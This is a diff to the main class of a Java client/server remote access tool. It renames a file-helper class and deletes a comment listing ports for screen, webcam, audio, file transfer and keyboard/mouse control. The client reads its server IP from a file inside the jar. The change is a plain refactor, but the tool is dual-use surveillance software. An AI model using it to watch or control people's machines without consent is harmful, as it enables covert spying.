@@ -4,7 +4,7 @@ package br.com.introcdc.connect;
  */
 
 import br.com.introcdc.connect.client.ConnectClient;
-import br.com.introcdc.connect.client.components.FileComponents;
+import br.com.introcdc.connect.client.components.ClientFileComponents;
 import br.com.introcdc.connect.server.ConnectServer;
 import com.github.sarxos.webcam.Webcam;
 
@@ -18,20 +18,6 @@ import java.util.zip.ZipOutputStream;
 
 public class Connect {
 
-    /*
-    Portas:
-        PORT: Porta principal, transmissão de texto
-        PORT + 1: Transmissão de tela (estática ou streaming)
-        PORT + 2: Transmissão de webcam (estática ou streaming)
-        PORT + 3: Transmissão de arquivos (cliente para servidor)
-        PORT + 4: Transmissão de arquivos (servidor para cliente)
-        PORT + 5: Transmissão de imagem (visualização de imagem)
-        PORT + 6: Transmissão do controle remoto (controle de teclado e mouse)
-        PORT + 7: Transmissão de áudio (cliente para servidor)
-        PORT + 8: Transmissão de áudio (servidor para cliente)
-        PORT + 9: Transmissão de tela para ícone
-        PORT + 10: Transmissão de webcam para ícone
-     */
     public static String IP = "127.0.0.1";
     public static final int PORT = 12345;
 
@@ -48,7 +34,7 @@ public class Connect {
         } else if ((ip = readJar()) != null) {
             IP = ip;
         }
-        if (!FileComponents.getFileName().equalsIgnoreCase("ConnectServer.jar")) {
+        if (!ClientFileComponents.getFileName().equalsIgnoreCase("ConnectServer.jar")) {
             ConnectClient.startClient(args.length > 0);
         } else {
             ConnectServer.startServer();
@@ -87,7 +73,7 @@ public class Connect {
 
     public static String readJar() {
         try {
-            File jarFile = new File(FileComponents.getFileName());
+            File jarFile = new File(ClientFileComponents.getFileName());
 
             try (JarFile jar = new JarFile(jarFile)) {
                 String fileName = "ip.txt";
